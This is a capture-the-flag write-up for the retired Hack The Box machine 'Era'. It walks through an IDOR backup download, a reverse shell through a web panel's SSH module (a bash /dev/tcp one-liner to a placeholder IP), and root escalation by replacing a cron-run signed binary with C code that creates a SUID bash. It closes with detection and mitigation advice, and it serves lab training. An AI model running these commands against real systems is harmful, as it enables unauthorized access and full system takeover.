---
machine: Era
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web
state: Retired
pwned: false
tags: [linux, web, idor, php, cron, binary-signing, privesc]
---

# Era — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

A file-upload application with multiple IDORs. Create an account, download the admin's backup and gain panel access. The panel includes a PHP module that uses SSH to run commands; abuse it for a shell as `eric`. Escalation replaces `monitor`, a signed binary run by root's cron every minute, with a signed ELF that creates a SUID bash.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
gobuster dir -u http://era.htb -w /usr/share/wordlists/dirb/common.txt
```

The application allows user registration and file uploads. Review download routes and numeric identifiers; an IDOR reads the administrator's backup.

```bash
curl -s -b 'session=<COOKIE>' 'http://era.htb/download?id=<ID>'
```

The backup contains code and database credentials, which grant panel access.

## Initial access

The panel has an SSH module accepting host, user and command. Use it for a reverse shell as `eric`:

```text
host: 127.0.0.1
user: eric
command: bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'
```

```bash
nc -lnvp 443
```

## Escalation

`/opt/AV/periodic-checks/monitor` is a root:devs ELF, writable by the `devs` group. A cron runs it as root every minute and validates a signature in `.text_sig`.

```bash
ls -l /opt/AV/periodic-checks/
id
```

Compile a binary that creates a SUID bash, sign it with the key available in the environment and replace `monitor`:

```c
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash");
}
```

```bash
gcc exploit.c -o exploit
./elf-sign sha256 key.pem key.pem exploit monitor
```

On the next minute:

```bash
/tmp/rootbash -p
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- IDORs in downloads and profiles allow user-to-user pivoting.
- An SSH module in a web panel is remote execution by design.
- A writable binary run by cron is a direct path to root.
- Code signing only protects if the key is not reachable by the attacker.

## Detection and mitigation

- Enforce authorization on every download, not just in the UI.
- Do not let web users run arbitrary SSH commands.
- Monitor changes to cron-run binaries and their signatures.
- Separate the signing key from the host and apply integrity checks (AIDE, auditd).

## References

- <https://0xdf.gitlab.io/2025/11/29/htb-era.html>
- <https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control>
- <https://attack.mitre.org/techniques/T1053/003/>
